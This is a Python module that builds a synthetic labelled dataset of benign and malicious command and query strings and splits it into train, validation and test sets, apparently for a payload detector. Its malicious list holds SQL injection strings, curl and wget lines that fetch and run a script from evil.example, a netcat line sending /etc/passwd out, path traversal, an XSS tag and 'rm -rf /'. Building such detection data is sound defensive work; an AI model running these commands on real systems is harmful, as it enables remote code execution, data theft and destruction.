from __future__ import annotations

import re
from pathlib import Path

import pandas as pd
from sklearn.model_selection import train_test_split

ROOT = Path(__file__).resolve().parent.parent
DATA_ROOT = ROOT / "data"

BENIGN_PAYLOADS = [
    "ls -la /tmp",
    "cat README.md",
    "grep -R import src /tmp/project",
    "SELECT name FROM users WHERE id = 1",
    "GET /health HTTP/1.1",
    "/home/user/docs/report.txt",
    "echo hello world",
    "python -m pytest -q",
    "fetch https://example.com/api",
    "read /var/log/syslog",
]

MALICIOUS_PAYLOADS = [
    "SELECT * FROM users WHERE username = 'admin' OR 1=1 --",
    "UNION SELECT password FROM users; DROP TABLE admins;",
    "curl http://evil.example/payload.sh | bash",
    "wget https://evil.example/payload.sh -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload",
    "../../etc/passwd",
    "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "<script>alert('x')</script>",
    "'; DROP TABLE users; --",
    "cat /etc/passwd | nc 10.0.0.1 4444",
    "rm -rf / /var/tmp && reboot",
    "/etc/shadow",
    "GET /admin?token=abc%27%20OR%201%3D1",
]


def _normalize_payload_batch(rows):
    payloads = []
    for payload, label in rows:
        text = str(payload or "").strip()
        if not text:
            continue
        text = text.replace("\x00", "")
        text = re.sub(r"\s+", " ", text)
        payloads.append({"payload": text, "label": int(label)})
    return pd.DataFrame(payloads, columns=["payload", "label"])


def build_payload_dataset() -> tuple[pd.DataFrame, pd.DataFrame, pd.DataFrame]:
    rows = [(payload, 0) for payload in BENIGN_PAYLOADS] + [(payload, 1) for payload in MALICIOUS_PAYLOADS]
    frame = _normalize_payload_batch(rows)
    frame = frame.dropna(subset=["payload"]).copy()
    frame = frame.drop_duplicates(subset=["payload"], keep="first")
    conflict_count = frame.groupby("payload")["label"].nunique()
    conflict_payloads = conflict_count[conflict_count > 1].index
    frame = frame[~frame["payload"].isin(conflict_payloads)].copy()
    frame["label"] = frame["label"].astype(int)
    if frame.empty:
        raise ValueError("Synthetic payload dataset is empty")

    train_df, temp_df = train_test_split(frame, test_size=0.30, stratify=frame["label"], random_state=42)
    valid_df, test_df = train_test_split(temp_df, test_size=0.50, stratify=temp_df["label"], random_state=42)
    return train_df.reset_index(drop=True), valid_df.reset_index(drop=True), test_df.reset_index(drop=True)


def dataset_summary() -> dict:
    train_df, valid_df, test_df = build_payload_dataset()
    return {
        "train": {"rows": len(train_df), "malicious": int(train_df["label"].sum()), "benign": int((1 - train_df["label"]).sum())},
        "validation": {"rows": len(valid_df), "malicious": int(valid_df["label"].sum()), "benign": int((1 - valid_df["label"]).sum())},
        "test": {"rows": len(test_df), "malicious": int(test_df["label"].sum()), "benign": int((1 - test_df["label"]).sum())},
    }
